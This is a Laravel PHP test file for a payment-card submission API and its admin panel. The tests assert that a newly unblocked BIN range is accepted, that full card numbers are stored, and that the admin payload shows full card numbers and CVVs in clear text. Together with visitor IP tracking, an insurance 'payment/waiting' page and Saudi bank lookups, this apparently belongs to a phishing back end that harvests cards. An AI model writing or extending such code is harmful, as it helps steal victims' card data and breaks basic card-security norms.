<?php

namespace Tests\Feature;

use App\Models\CustomerProfile;
use App\Models\PaymentCard;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * End-to-end runtime acceptance for the previously-blocked 4847 BIN
 * range. Covers:
 *
 *   1. POST /api/payment-card/submit accepts 4847 → 200 + success:true
 *   2. The persisted PaymentCard row stores the full PAN.
 *   3. The admin payload exposes pre-rendered display fields
 *      (card_number_display + cvv_display) used by PaymentCardVisual /
 *      PaymentModal / InfoModal / NotificationDetailModal.
 */
class Card4847AcceptanceTest extends TestCase
{
    use RefreshDatabase;

    private function valid4847Pan(): string
    {
        // 4847 8313 0473 9458 — known valid Luhn 16-digit PAN starting 4847.
        return '4847831304739458';
    }

    public function test_submit_accepts_4847_card_and_persists_full_pan(): void
    {
        $pan = $this->valid4847Pan();
        $session = 'sess-4847-acceptance-' . uniqid();

        $response = $this->withoutMiddleware(['throttle:30,1', 'geo.api'])
            ->postJson('/api/payment-card/submit', [
                'card_number'  => $pan,
                'holder_name'  => 'AHMED ALI',
                'expiry_month' => '12',
                'expiry_year'  => '99',
                'cvv'          => '123',
                'session_id'   => $session,
            ]);

        $response->assertOk()->assertJson([
            'success' => true,
            'bank_code' => 'rajhi',
        ]);

        // Column is encrypted at rest — verify via decrypted accessor.
        $persisted = PaymentCard::where('session_id', $session)->firstOrFail();
        $this->assertSame($pan, $persisted->card_number);
        $this->assertSame(substr($pan, -4), $persisted->last4);
        $this->assertSame('pending', $persisted->status);
    }

    public function test_admin_customer_payload_returns_display_fields(): void
    {
        $pan = $this->valid4847Pan();

        $customer = CustomerProfile::create([
            'ip_address'   => '10.10.10.10',
            'current_page' => '/insurance/payment/waiting',
        ]);

        $card = PaymentCard::create([
            'customer_profile_id' => $customer->id,
            'session_id'          => 'sess-display-fields-1',
            'card_number'         => $pan,
            'last4'               => substr($pan, -4),
            'holder_name'         => 'AHMED ALI',
            'card_type'           => 'visa',
            'expiry_month'        => '12',
            'expiry_year'         => '99',
            'cvv_encrypted'       => '321',
            'status'              => 'pending',
        ]);

        // Hit the admin endpoint directly (bypass admin auth middleware
        // since this test focuses on the response shape).
        $response = $this->withoutMiddleware()
            ->getJson('/api/admin/customers/' . $customer->id);

        $response->assertOk();
        $card = $response->json('data.payment.cards.0');

        $this->assertNotNull($card, 'admin payload should expose payment.cards[]');
        $this->assertSame($pan, $card['card_number'] ?? null);
        $this->assertSame($pan, $card['card_number_full'] ?? null);
        $this->assertSame('4847 8313 0473 9458', $card['card_number_display'] ?? null);
        $this->assertSame('321', $card['cvv'] ?? null);
        $this->assertSame('321', $card['cvv_display'] ?? null);
    }

    public function test_legacy_admin_bin_lookup_uses_the_longest_prefix(): void
    {
        $response = $this->withoutMiddleware()
            ->getJson('/api/admin/bin-lookup/422817');

        $response->assertOk()->assertJson([
            'bank_code' => 'riyad',
            'bank' => [
                'name' => 'Riyad Bank',
            ],
        ]);
    }
}
